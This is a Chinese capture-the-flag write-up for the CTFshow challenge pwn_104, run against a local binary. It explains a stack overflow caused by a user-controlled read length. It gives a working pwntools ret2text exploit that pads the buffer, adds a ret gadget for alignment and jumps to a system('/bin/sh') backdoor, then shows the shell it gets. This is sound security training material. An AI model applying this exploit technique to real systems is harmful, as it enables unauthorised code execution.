# CTFshow-pwn_104
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 整数安全（栈溢出）
## 解题思路
> ret2text ~~只是涉及到整数而已~~

仅开启 NX 保护
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_104
[*] '/home/mrw/CTFshow/pwn_104'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
程序在主函数中调用的漏洞函数 `ctfshow()` 伪代码如下  
```c
ssize_t ctfshow()
{
  char buf[10]; // [rsp+2h] [rbp-Eh] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  LODWORD(nbytes) = 0;
  puts("How long are you?");
  __isoc99_scanf("%d", &nbytes);
  puts("Who are you?");
  return read(0, buf, (unsigned int)nbytes);
}
```
程序中存在后门函数`that()`  
```asm
; Attributes: bp-based frame

; int that()
public that
that proc near
; __unwind {
push    rbp
mov     rbp, rsp
lea     rdi, command    ; "/bin/sh"
call    _system
nop
pop     rbp
retn
; } // starts at 40078D
that endp
main endp
```
`read` 函数读取字节数可控制，可以大于缓冲区长度触发栈溢出并覆盖返回地址，采用 ret2text。  
由于栈对齐问题，需要先 retn 一次再劫持到 `that` 函数   
**exp 如下**  
```python
from pwn import *
p = process('./pwn_104')
p.sendline(b'38') # 10+4+8+8+8
p.send(b'a'*22 + p64(0x4007f7) + p64(0x40078d))
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_104.py 
[+] Starting local process './pwn_104': pid 16573
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Integer_Overflow                                        
    * Site  : https://ctf.show/                                       
    * Hint  : First this way, then that !                             
    * *************************************                           
How long are you?
Who are you?
$ ls /
bin		   dev	 lib32		    media  run		       swap.img
bin.usr-is-merged  etc	 lib64		    mnt    sbin		       sys
boot		   flag  lib.usr-is-merged  opt    sbin.usr-is-merged  tmp
cdrom		   home  libx32		    proc   snap		       usr
ctfshow_flag	   lib	 lost+found	    root   srv		       var
$ cat /ctfshow_flag
flag{Success!}

```
